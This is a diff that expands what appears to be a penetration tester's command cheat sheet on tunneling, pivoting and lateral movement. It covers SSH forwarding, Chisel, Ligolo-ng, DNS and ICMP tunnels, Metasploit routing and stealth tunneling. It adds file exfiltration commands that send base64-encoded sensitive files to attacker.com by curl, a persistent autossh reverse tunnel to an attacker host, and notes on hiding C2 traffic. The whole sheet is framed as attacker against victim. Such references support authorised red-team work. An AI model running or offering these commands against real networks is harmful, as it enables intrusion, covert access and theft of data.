@@ -1,40 +1,132 @@
-% tunnels, ssh, pivoting, portforward, proxy
+% tunnels, ssh, pivoting, portforward, proxy, lateral-movement
 
-# SSH local port forward
+# ============================================================================
+# SSH TUNNELING & PORT FORWARDING
+# ============================================================================
+
+# SSH local port forward (access internal service through jump host)
 ssh -L <local_port>:<target_host>:<target_port> <user>@<jump_host>
 
-# SSH remote port forward
+# SSH local port forward example: Access internal web server
+ssh -L 8080:internal-web.corp.local:80 user@jump.example.com
+# Then browse to: http://localhost:8080
+
+# SSH remote port forward (expose local service to remote)
 ssh -R <remote_port>:<local_host>:<local_port> <user>@<remote_host>
 
-# SSH dynamic SOCKS proxy
+# SSH remote port forward example: Expose local web server remotely
+ssh -R 9090:localhost:80 user@attacker.com
+# Remote users can now access: http://attacker.com:9090
+
+# SSH dynamic SOCKS proxy (route all traffic through jump host)
 ssh -D <socks_port> <user>@<host>
 
-# SSH with ProxyJump (bastion)
+# SSH dynamic SOCKS example
+ssh -D 1080 user@jump.example.com
+# Configure browser/apps to use SOCKS5 proxy: localhost:1080
+
+# SSH with ProxyJump (bastion/jump host)
 ssh -J <user>@<jump_host> <user>@<target_host>
 
-# SSH tunnel background
+# SSH multiple ProxyJumps (chain through multiple hosts)
+ssh -J <user>@<jump1>,<user>@<jump2> <user>@<target>
+
+# SSH tunnel background (-f = fork, -N = no command)
 ssh -fN -L <local_port>:<target_host>:<target_port> <user>@<jump_host>
 
-# SSH reverse tunnel (callback)
+# SSH reverse tunnel (callback from compromised host)
 ssh -fN -R <remote_port>:localhost:22 <user>@<attacker_host>
 
-# Chisel server (on attacker)
+# SSH with keep-alive (prevent timeout)
+ssh -o ServerAliveInterval=60 -o ServerAliveCountMax=3 <user>@<host>
+
+# SSH tunnel with specific identity file
+ssh -i <private_key> -L <local_port>:<target>:<target_port> <user>@<jump>
+
+# SSH tunnel through multiple hops
+ssh -L 8080:final-target:80 -J jump1,jump2 user@jump3
+
+# ============================================================================
+# CHISEL - Fast TCP/UDP Tunnel Over HTTP
+# ============================================================================
+
+# Chisel server (on attacker machine)
 chisel server -p <port> --reverse
 
-# Chisel client reverse SOCKS
+# Chisel server with authentication
+chisel server -p <port> --reverse --auth <username>:<password>
+
+# Chisel server example (listen on 8080)
+chisel server -p 8080 --reverse
+
+# Chisel client reverse SOCKS (victim → attacker)
 chisel client <attacker_ip>:<port> R:socks
 
-# Chisel client port forward
+# Chisel client reverse SOCKS on custom port
+chisel client <attacker_ip>:<port> R:1080:socks
+
+# Chisel client reverse SOCKS example
+chisel client 192.168.1.50:8080 R:socks
+# Attacker can now use SOCKS5 proxy on localhost:1080
+
+# Chisel client reverse port forward
 chisel client <attacker_ip>:<port> R:<remote_port>:<target_host>:<target_port>
 
-# Chisel client local forward
+# Chisel reverse port forward example (expose internal RDP)
+chisel client 192.168.1.50:8080 R:3389:10.0.0.10:3389
+# Attacker can now: rdesktop localhost:3389
+
+# Chisel client local forward (attacker → victim)
 chisel client <server_ip>:<port> <local_port>:<target_host>:<target_port>
 
-# Ligolo-ng proxy (attacker)
-./proxy -selfcert
+# Chisel with authentication
+chisel client --auth <username>:<password> <server_ip>:<port> R:socks
 
-# Ligolo-ng agent (victim)
-./agent -connect <attacker_ip>:11601 -ignore-cert
+# Chisel multiple tunnels
+chisel client <attacker_ip>:<port> R:1080:socks R:3389:10.0.0.10:3389
+
+# Chisel over HTTPS (encrypted)
+chisel server -p 443 --reverse --tls-key server.key --tls-cert server.crt
+chisel client https://<attacker_ip>:443 R:socks
+
+# Chisel with keep-alive
+chisel client --keepalive 25s <attacker_ip>:<port> R:socks
+
+# ============================================================================
+# LIGOLO-NG - Advanced Tunneling Tool
+# ============================================================================
+
+# Ligolo-ng proxy (on attacker machine)
+./ligolo-proxy -selfcert
+
+# Ligolo-ng proxy with specific interface
+./ligolo-proxy -selfcert -laddr 0.0.0.0:11601
+
+# Ligolo-ng agent (on victim/compromised machine)
+./ligolo-agent -connect <attacker_ip>:11601 -ignore-cert
+
+# Ligolo-ng agent with retry
+./ligolo-agent -connect <attacker_ip>:11601 -ignore-cert -retry
+
+# Ligolo-ng agent example
+./ligolo-agent -connect 192.168.1.50:11601 -ignore-cert
+
+# After agent connects, in ligolo-proxy console:
+# 1. Select session: session
+# 2. Add route: route_add --name <route_name> --route <subnet>
+# 3. Start tunnel: start
+
+# Example ligolo-proxy commands:
+# List sessions: session
+# Select session 1: session 1
+# Add route: route_add --name internal --route 10.0.0.0/24
+# Start tunnel: start
+# Stop tunnel: stop
+
+# Ligolo-ng with TUN interface (better routing)
+# On attacker (requires TUN): sudo ip tuntap add user <username> mode tun ligolo
+# Then: sudo ip link set ligolo up
+# In proxy: start --tun ligolo
 
 # Socat port forward
 socat TCP-LISTEN:<local_port>,fork TCP:<target_host>:<target_port>
@@ -112,3 +204,111 @@ $ network_cidr: echo "10.0.0.0/24"
 $ interface: echo "wg0"
 $ output_file: echo "received_file"
 $ input_file: find . -type f 2>/dev/null | head -5
+
+# ============================================================================
+# ADVANCED PIVOTING TECHNIQUES
+# ============================================================================
+
+# Double pivot (compromised host → internal network → deeper internal network)
+# On compromised host 1: ssh -D 1080 user@internal-host
+# On attacker: proxychains ssh -D 9050 user@compromised-host-1
+# Chain: Attacker → 1080 (comp1) → 9050 (internal) → deep internal
+
+# SSH tunneling with ProxyCommand
+# ~/.ssh/config:
+# Host internal-server
+#   ProxyCommand ssh jump-host -W %h:%p
+#   User admin
+
+# Dynamic port forwarding with netsh (Windows)
+netsh interface portproxy add v4tov4 listenport=<listen_port> connectaddress=<target> connectport=<target_port>
+
+# HTTP tunneling with reGeorg
+python reGeorgSocksProxy.py -p 1080 -u http://target.com/tunnel.aspx
+
+# DNS tunneling with iodine
+# Server: iodined -f -c -P <password> 10.0.0.1 tunnel.example.com
+# Client: iodine -f -P <password> tunnel.example.com
+
+# ICMP tunneling with ptunnel
+# Server: ptunnel
+# Client: ptunnel -p <server_ip> -lp <local_port> -da <dest_ip> -dp <dest_port>
+
+# Metasploit autoroute for pivoting
+# In meterpreter:
+# run autoroute -s 10.0.0.0/24
+# background
+# use auxiliary/server/socks_proxy
+# set SRVPORT 1080
+# run -j
+
+# Metasploit port forwarding
+# In meterpreter:
+# portfwd add -l 3389 -p 3389 -r 10.0.0.10
+# Now RDP to localhost:3389
+
+# ============================================================================
+# EXFILTRATION OVER TUNNELS
+# ============================================================================
+
+# Exfil over DNS (dnscat2)
+# Server: dnscat2-server tunnel.example.com
+# Client: dnscat2 tunnel.example.com
+
+# Exfil over HTTPS with curl
+curl -X POST -H "Content-Type: application/octet-stream" --data-binary @<file> https://attacker.com/upload
+
+# Exfil with base64 encoding over HTTP
+cat <sensitive_file> | base64 | curl -X POST -d @- https://attacker.com/data
+
+# ============================================================================
+# REVERSE TUNNELING SCENARIOS
+# ============================================================================
+
+# Scenario: Victim behind NAT, attacker has public IP
+# Attacker runs: ssh -R 9999:localhost:22 user@victim-accessible-host
+# Victim connects back, opening tunnel for attacker to SSH in
+
+# Reverse SSH tunnel for web server
+# Victim: ssh -R 8080:localhost:80 user@attacker.com
+# Attacker accesses: http://localhost:8080
+
+# Persistent reverse tunnel with autossh
+autossh -M 0 -f -N -R 9999:localhost:22 user@attacker.com
+
+# ============================================================================
+# OBFUSCATION & STEALTH
+# ============================================================================
+
+# SSH over HTTP (using corkscrew through HTTP proxy)
+ssh -o "ProxyCommand corkscrew <proxy> <proxy_port> %h %p" user@target
+
+# Encrypted DNS tunnel (DNS-over-HTTPS)
+# Use DoH to tunnel C2 traffic
+
+# WebSocket tunneling (wstunnel)
+# Server: wstunnel -s 0.0.0.0:8080
+# Client: wstunnel -t 127.0.0.1:1080 ws://<server>:8080
+
+# TLS/SSL tunneling with stunnel
+# stunnel.conf:
+# [https]
+# client = yes
+# accept = 127.0.0.1:8080
+# connect = target.com:443
+
+# ============================================================================
+# KILL TUNNELS / CLEANUP
+# ============================================================================
+
+# Kill all SSH tunnels
+ps aux | grep 'ssh -' | grep -v grep | awk '{print $2}' | xargs kill
+
+# Kill specific port forward
+lsof -ti:8080 | xargs kill -9
+
+# Remove netsh portproxy (Windows)
+netsh interface portproxy reset
+
+# Check active SSH tunnels
+ps aux | grep ssh | grep -E '(-L|-R|-D)'
